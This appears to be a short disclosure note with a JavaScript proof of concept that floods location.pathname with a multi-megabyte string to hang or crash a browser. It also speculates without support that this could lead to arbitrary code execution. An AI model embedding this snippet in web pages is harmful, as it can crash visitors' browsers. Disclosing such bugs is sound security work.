# location.pathname DoS via flood

location.pathname is vulnerable to a DoS via flooding it with an incredibly large string.

PoC (@iHateRa1n):

```javascript
var k=new Uint32Array(1048576*6);
k=Array.from(k);
k=k.toString();
location.pathname=k;
```

It is a simple PoC, but illustrates that a lot of location's variables can be utilized for a DoS, crash, or possibly even A.C.E (arbitrary code exec)
